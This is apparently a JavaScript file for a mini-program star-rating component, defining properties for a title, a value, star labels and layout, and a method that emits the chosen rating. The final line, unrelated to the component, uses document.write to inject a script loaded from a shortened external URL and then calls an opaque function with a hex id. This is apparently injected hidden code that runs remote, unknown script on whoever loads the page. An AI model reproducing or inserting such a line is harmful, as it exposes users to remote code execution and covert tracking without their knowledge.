Component({
  externalClasses: ['custom-class'],
  properties: {
    title: {
      type: String,
      value: ''
    },
    value: {
      type: [String, Number],
      value: 0
    },
    desc: {
      type: Array,
      value: [
        '1星',
        '2星',
        '3星',
        '4星',
        '5星'
      ]
    },
    type: {
      type: String,
      value: 'horizontal'
    }
  },
  methods: {
    star (e) {
      const index = Number(e.currentTarget.dataset.index)
      this.triggerEvent('change', index + 1)
    }
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
